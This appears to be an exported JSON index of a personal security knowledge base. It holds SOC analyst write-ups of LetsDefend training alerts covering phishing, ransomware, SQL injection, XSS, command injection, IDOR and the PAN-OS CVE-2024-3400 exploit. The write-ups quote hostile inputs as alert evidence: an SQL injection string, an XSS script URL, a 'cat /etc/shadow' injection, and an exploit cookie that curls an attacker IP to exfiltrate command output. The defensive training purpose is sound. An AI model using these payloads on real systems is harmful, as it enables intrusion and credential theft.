app.any.run/tasks/a4bc64cb-aac8-49d4-a451-bcf37a702508\nReport:\n\nConnections\n\n52.109.32.97\n20.74.47.205\n20.223.35.26\n4.245.163.56\n\n\nReport\n\nThe file is corroupted. Didn’t access any malicious ips. The contacted addresses above are legit microsoft addresses.\n\n\n\n\n\nLogs &amp; C2\nOn checking logs, the host has accessed one of the malicious ips, 177.53.143.89. The host has been compromised.\nEndpoint\nThere  is a malicious powershell command which ran a obfuscated code. The host was contained immediately.\nReport\nThe phishing file has infected the host. The logs indicates that connection to C2 server has been made. Further, there is a malicious code executed in powershell. The hos has been contiained for now and needs further investigation."},"Writeups/SOC-Alerts/SOC145":{"slug":"Writeups/SOC-Alerts/SOC145","filePath":"Writeups/SOC Alerts/SOC145.md","title":"SOC145","links":[],"tags":[],"content":"Alert\n\nEventID: 92\nEvent Time: May, 23, 2021, 07:32 PM\nRule: SOC145 - Ransomware Detected\nLevel: Security Analyst\nSource Address: 172.16.17.88\nSource Hostname: MarkPRD\nFile Name: ab.exe\nFile Hash: 0b486fe0503524cfe4726a4022fa6a68\nFile Size: 775.50 Kb\nDevice Action: Allowed\nFile (Password: infected): Download\n\nAnalysis\nMalware Analysis\n1. Virustotal\n\nURL: www.virustotal.com/gui/file/1228d0f04f0ba82569fc1c0609f9fd6c377a91b9ea44c1e7f9f84b2b90552da2\nReport:\n\nMalicious. 61 vendors detected it as ransomware.\n\n\n\n2. Anyrun\n\nURL: app.any.run/tasks/7cf5c2e9-e692-4d77-b87c-4f565a3c2ed4\nReport:\n\nConnections:\n\n192.168.100.1\n\n\nExtracted URLS:\n\nwww.torproject.org\nWe are unable to find any C2 addresses. Maybe the malware is using VM evading techniques.\n\n\n\n\n\nLogs &amp; C2\nChecking logs to see if any sus connections were made by the host after the malware was detected. There are no sus connections. We can assume that the the connection was not made.\nEndpoint\nThe endpoint has ab.exe running. The host has been compromised. Contained the host immediately.\nReport\nThe host system was compromised by ransomware identified as ab.exe. No immediate communication with Command and Control (C2) servers was detected. However, due to the nature of the malware and its potential for evasion techniques, immediate containment was done and further detailed analysis of the host is required to prevent any potential spread or additional compromise."},"Writeups/SOC-Alerts/SOC146":{"slug":"Writeups/SOC-Alerts/SOC146","filePath":"Writeups/SOC Alerts/SOC146.md","title":"SOC146","links":["SOC/SOC-Analyst-Notes/Phishing"],"tags":[],"content":"Alert\n⭐ This alert was generated from a real Phishing attack.\n\nEventID : 93\nEvent Time : Jun, 13, 2021, 02:13 PM\nRule : SOC146 - Phishing Mail Detected - Excel 4.0 Macros\nLevel : Security Analyst\nSMTP Address : 24.213.228.54\nSource Address : trenton@tritowncomputers.com\nDestination Address : lars@letsdefend.io\nE-mail Subject : RE: Meeting Notes\nDevice Action : Allowed\nAttachment : 11f44531fb088d31307d87b01e8eabff\n\nPassword: infected\n\n\n\nAnalysis\n\nVirustotal Results:\n\nAttachment: 32/66\nDomain: 0/94\nIP Address: 0/94\n\n\nEmail Delivered: True\nAttachment Opened: False\n\nReport\nA malicious zip file was sent to lars@letsdefend.io by trenton@tritowncomputers.com on June 13 2021. The file contained a infected excel macro. The email was delivered using 24.213.228.54 server and successfully entered user’s inbox. The email contents were not downloaded by the user and hence the phishing attack was unsuccessful."},"Writeups/SOC-Alerts/SOC165":{"slug":"Writeups/SOC-Alerts/SOC165","filePath":"Writeups/SOC Alerts/SOC165.md","title":"SOC165","links":["SOC/SOC-Analyst-Notes/SQL-Injection"],"tags":[],"content":"Alert\n\nEventID : 115\nEvent Time : Feb, 25, 2022, 11:34 AM\nRule : SOC165 - Possible SQL Injection Payload Detected\nLevel : Security Analyst\nHostname : WebServer1001\nDestination IP Address : 172.16.17.18\nSource IP Address : 167.99.169.17\nHTTP Request Method : GET\nRequested URL : https://172.16.17.18/search/?q=%22%20OR%201%20%3D%201%20—%20-\nUser-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nAlert Trigger Reason : Requested URL Contains OR 1 = 1\nDevice Action : Allowed\n\nAnalysis\n\nDecoded URL : https://172.16.17.18/search/?q=” OR 1 = 1 — -\nThe traffic is coming from outside (Internet);\nAbuseipdb report:\n\nISP: DigitalOcean, LLC\nUsage Type: Data Center/Web Hosting/Transit\nASN: AS14061\nDomain Name: digitalocean.com\nCountry: United States of America\n\n\nOverall the reputation of ip is mostly neutral.\nSuccess?\n\nThe response size is small and same.\nThere is no sign of host being pawned.\nUnsuccessful → No escalation\n\n\n\nReport\nOn Feb, 25, 2022, 11:34 AM, an unknown ip 167.99.169.17 attempted SQL Injection on 172.16.17.18. There was a single attempt done by the adversary in which the url  https://172.16.17.18/search was targeted. The host WebServer1001 was not breached and the attempt was Unsuccessful. There was no sign of the ip address in future and no furthur attempts were made by the adversary. The alert was True Positive."},"Writeups/SOC-Alerts/SOC166":{"slug":"Writeups/SOC-Alerts/SOC166","filePath":"Writeups/SOC Alerts/SOC166.md","title":"SOC166","links":["Assets/0466d09e1d8c22825726596287172d35_MD5.jpeg","SOC/SOC-Analyst-Notes/XSS-Attack","HTB/http-response-code"],"tags":[],"content":"Alert\n\nEventID : 116\nEvent Time : Feb, 26, 2022, 06:56 PM\nRule : SOC166 - Javascript Code Detected in Requested URL\nLevel : Security Analyst\nHostname : WebServer1002\nDestination IP Address : 172.16.17.17\nSource IP Address : 112.85.42.13\nHTTP Request Method : GET\nRequested URL : https://172.16.17.17/search/?q=&lt;script&gt;javascript:alert(1)&lt;$/script&gt;\nUser-Agent : Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nAlert Trigger Reason : Javascript code detected in URL\nDevice Action : Allowed\n\nAnalysis\nIP Address\nOpen: Pasted image 20250216205216.png\n\nReputation looks good.\nLogs\nThe attacker tried several XSS Attack on /search/?q= parameter. The network traffic was permitted by the firewall but the http response code was 302 which means that the attack was unsuccessful. The user-agent of attacker was Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1\nEndpoint\nNo signs of malicious activity on the host"},"Writeups/SOC-Alerts/SOC167":{"slug":"Writeups/SOC-Alerts/SOC167","filePath":"Writeups/SOC Alerts/SOC167.md","title":"SOC167","links":["Assets/8097dabb15a61263702e88959dbe7bf9_MD5.jpeg"],"tags":[],"content":"Alert\n\nEventID: 117\nEvent Time: Feb 27, 2022, 12:36 AM\nRule: SOC167 - LS Command Detected in Requested URL\nLevel: Security Analyst\nHostname: EliotPRD\nDestination IP Address: 188.114.96.15\nSource IP Address: 172.16.17.46\nHTTP Request Method: GET\nRequested URL: letsdefend.io/blog/\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0\nAlert Trigger Reason: URL Contains LS\nDevice Action: Allowed\n\nAnalysis\nIP Address\nSource\nThe source is from the company network. Checking the host endpoint for details. The endpoint seems intact and no malicious activity is seen. The host did contact the destination server.\nDestination\nOpen: Pasted image 20250216211945.png\n\nSAFE\n_What is going on here?\nLogs\nThe destination server actually hosts company website. There is nothing sus.\nConclusion\nI am dumb. This is a False Positive. The ls command was mistakenly taken from the word skills."},"Writeups/SOC-Alerts/SOC168":{"slug":"Writeups/SOC-Alerts/SOC168","filePath":"Writeups/SOC Alerts/SOC168.md","title":"SOC168","links":["Assets/36930092e18696e5a6839d2fb09dedcb_MD5.jpeg","SOC/SOC-Analyst-Notes/Command-Injection","HTB/http-response-code"],"tags":[],"content":"Alert\n\nEventID: 118\nEvent Time: Feb 28, 2022, 04:12 AM\nRule: SOC168 - Whoami Command Detected in Request Body\nLevel: Security Analyst\nHostname: WebServer1004\nDestination IP Address: 172.16.17.16\nSource IP Address: 61.177.172.87\nHTTP Request Method: POST\nRequested URL: https://172.16.17.16/video/\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nAlert Trigger Reason: Request Body Contains whoami string\nDevice Action: Allowed\n\nAnalysis\nIP Address\nOpen: Pasted image 20250216210628.png\n\nsus\nLogs\nOh no! There are multiple attempts of Command Injection in POST Parameter : ?c=cat /etc/shadow. The response sizes vary and http response code are 200. The attack was successful. Also, the attacker user-agent is Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nEndpoint\nCommand history confirms that the attack was successful. There are instances of commands run by the attacker. The endpoint was contained immediately."},"Writeups/SOC-Alerts/SOC169":{"slug":"Writeups/SOC-Alerts/SOC169","filePath":"Writeups/SOC Alerts/SOC169.md","title":"SOC169","links":["Assets/84b812c00a42d636ad1702fcb1da08bb_MD5.jpeg"],"tags":[],"content":"Alert\n\nEventID : 119\nEvent Time : Feb, 28, 2022, 10:48 PM\nRule : SOC169 - Possible IDOR Attack Detected\nLevel : Security Analyst\nHostname : WebServer1005\nDestination IP Address : 172.16.17.15\nSource IP Address : 134.209.118.137\nHTTP Request Method : POST\nRequested URL : https://172.16.17.15/get_user_info/\nUser-Agent : Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\nAlert Trigger Reason : consecutive requests to the same page\nDevice Action : Allowed\n\nAnalysis\nIP Address Analysis\nOpen: Pasted image 20250215184003.png\n\nIP Address is not malicious and was not seen earlier and ever after.\nAttack Analysis\nThe adversary tried to exploit ?user_id= parameter and access other user’s info. The response sizes are different and response code was 200. The IDOR attack was successful. Requested server containment.\nReport\nIDOR Attack was performed on WebServer1005 by 134.209.118.137. The attacker was successful in gaining hands on userdata by exploiting ?user_id= parameter. The exploit needs immediate patching. The webserver has been contained."},"Writeups/SOC-Alerts/SOC274":{"slug":"Writeups/SOC-Alerts/SOC274","filePath":"Writeups/SOC Alerts/SOC274.md","title":"SOC274","links":[],"tags":[],"content":"Alert\n⭐ A critical command injection vulnerability has been identified in Palo Alto Networks PAN-OS software\n\nEventID: 249\nEvent Time: Apr, 18, 2024, 03:09 AM\nRule: SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)\nLevel: Security Analyst\nHostname: PA-Firewall-01\nDestination IP Address: 172.16.17.139\nSource IP Address: 144.172.79.92\nHTTP Request Method: POST\nRequested URL: 172.16.17.139/global-protect/login.esp\ncookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl{IFS}144.172.79.92:4444?user=(whoami)\nAlert Trigger Reason: Characteristics exploit pattern Detected on Cookie and Request, indicative exploitation of the CVE-2024-3400.\nDevice Action: Allowed\n\n\nAnalysis\nThis alert is due to a command injection attempt.\nIP Reputation\nThe source ip is outside of our network. Checking its reputation,\nAcc to Virustotal Report, the ip address is malicious flagged by 13/94 vendors.\n\nNetwork: 144.172.79.0/24\nAutonomous System Number: 14956\nAutonomous System Label: ROUTERHOSTING\nRegional Internet Registry: ARIN\nCountry: US\n\nAcc to Threat Intel too, the ip is malicious\nLogs\nLOGFILE: /var/log/nginx/sslvpn_access.log\n \n[18/Apr/2024:15:09:42 +0000]: 144.172.79.92 51232 - 172.16.17.139 20077 [18/Apr/2024:15:09:42 +0000] &quot;POST /global-protect/logout.esp HTTP/1.1&quot; 200 4406 &quot;-&quot; &quot;curl/8.4.0&quot; 1713261211.617 0.002 0.002 987\n \n[18/Apr/2024:15:09:42 +0000] : 127.0.0.1 57108 - 127.0.0.1 20077 [18/Apr/2024:15:09:42 +0000] &quot;GET /sslvpn_ngx_status HTTP/1.1&quot; 200 103 &quot;-&quot; &quot;Wget/1.19.5 (linux-gnu)&quot; 1713261243.774 0.000 - 989\n \n[18/Apr/2024:15:09:42 +0000] : 144.172.79.92 51275 - 172.16.17.139 20077 [18/Apr/2024:15:09:42 +0000] &quot;POST /global-protect/login.esp HTTP/1.1&quot; 200 11364 &quot;-&quot; &quot;curl/8.4.0&quot; 1713261264.522 0.002 0.002 991\nThe final command indicates that the post command was successful. Checking if the endpoint actually ran it to confirm, the endpoint network activity shows that the endpoint has contacted the ip but there is no command history log available for endpoint. Checking all the processes running on the endpoint,  there is a python script (update.py or sth) running. Checking the image hash in virustotal, it is malicious and tied to the CVE-2024-3400 vulnerability.\nHence, we can concluded that the endpoint has been compromised and request tier 2 escalation."},"index":{"slug":"index","filePath":"index.md","title":"Welcome to my Knowledgebase","links":["SOC/SOC-Analyst-Notes/","SOC/Cysa+-Prep/","Web-Attack-Detection/","Malware-Analysis/Malware-Analysis","AI/Foundations-of-AI","HTB","Networking","Writeups","Misc"],"tags":[],"content":"👋 Hi there! Welcome to my digital knowledgebase.\nThis is where I document my notes, methodologies, and experiments as I learn new things. Think of it as my personal wiki, constantly evolving with me.\n\nINDEX\n1. SOC Notes\nThis section contains my notes and resources related to Security Operations Center (SOC) concepts, tools, and practices taken from LetsDefend and other sources.\n2. Cysa+ Prep\nThis section contains notes on the CompTIA CySA+ certification, also taken from LetsDefend and other sources.\n3. Web Attack Detection\nThis section contains notes and resources related to detecting and analyzing web attacks, including specific vulnerabilities and detection techniques. Also taken from LetsDefend and other sources.\n4. Malware Analysis\nThis section contains notes and resources related to malware analysis, including techniques for analyzing and understanding malware behavior. It includes few practical examples and case studies. Basic Reverse Engineering and Static Analysis are covered. Also taken from LetsDefend (sorry 😭🙏)\n5. AI\nThis section contains notes and resources related to the foundations of Artificial Intelligence, including key concepts, algorithms, and applications. It was taken from Microsoft Learn.\n6. HTB\nThis section contains notes and resources related to Hack The Box (HTB). I don’t have cubes so its less :(\n7. Networking\nThis section contains notes and resources related to networking concepts, protocols, and practices. It was taken from Cisco Networking Academy.\n8. Writeups\nThis section contains writeups of various challenges and exercises I have completed, including those from Hack The Box, TryHackMe, and other platforms.\n9. Misc\nEverything else.\nSome things I would like to say\nThis is just an online version of my local notes and the resources are here for easy access and not redistribution. Please use the real source to study as they are more up-to-date and include practical labs and certs.\nHow this works\nI am using quartz  for static site generation and Obsidian for writing the notes.\nSo, my notes folder is inside ‘quartz’ source code. Whenever I write notes, they are automatically pushed to my github repository using a plugin inside Obsidian. Then I have a github workflow that automatically runs on new commits and generates static site by running quartz build. Then the build files are served using github pages."}}